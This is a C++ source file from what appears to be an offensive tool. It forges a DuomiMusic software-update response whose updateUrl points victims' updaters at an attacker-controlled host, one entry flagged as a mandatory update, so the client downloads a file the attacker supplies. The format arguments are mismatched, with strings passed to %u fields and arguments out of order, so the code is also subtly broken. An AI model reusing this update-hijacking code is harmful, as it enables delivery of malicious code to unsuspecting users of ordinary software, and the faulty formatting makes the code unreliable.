


#include "DuomiMusic.h"
#include <windows.h>
#include <iostream>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "../HttpUtils.h"


using namespace std;


DuomiMusic::DuomiMusic(unsigned long ulIP, string filepath, string filename) {

	int ret = 0;

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);
	if (ret == FALSE)
	{
		return ;
	}

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=gbk\r\nContent-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"<response>\r\n"
		"<status>0</status>\r\n"
		"<resultCode>0</resultCode>\r\n"
		"<msg></msg>\r\n"
		"<entry>\r\n"
		"<updateFlag>1</updateFlag>\r\n"
		"<currentVersion>%u</currentVersion>\r\n"
		"<updateUrl>http://%s/%s</updateUrl>\r\n"
		"<fileName>%s</fileName>\r\n"
		"<description>3-26</description>\r\n"
		"<type>1</type>\r\n"
		"<must>0</must>\r\n"
		"<downloadFlag>1</downloadFlag>\r\n"
		"</entry>\r\n"
		"<entry>\r\n"
		"<updateFlag>1</updateFlag>\r\n"
		"<currentVersion>%u</currentVersion>\r\n"
		"<updateUrl>http://%s/%s</updateUrl>\r\n"
		"<fileName>%s</fileName>\r\n"
		"<description>4-6</description>\r\n"
		"<type>2</type>\r\n"
		"<must>1</must>\r\n"
		"<downloadFlag>1</downloadFlag>\r\n"
		"</entry>\r\n"
		"<collectLog>0</collectLog>\r\n"
		"</response>\r\n";


	string curver1 = "12003009";		//12003009
	string curver2 = "042018";			//042018

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,curver1.c_str(),
		szip.c_str(), filename.c_str(), filename.c_str(), szip.c_str(), filename.c_str(), filename.c_str(),curver2.c_str());

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return ;

}


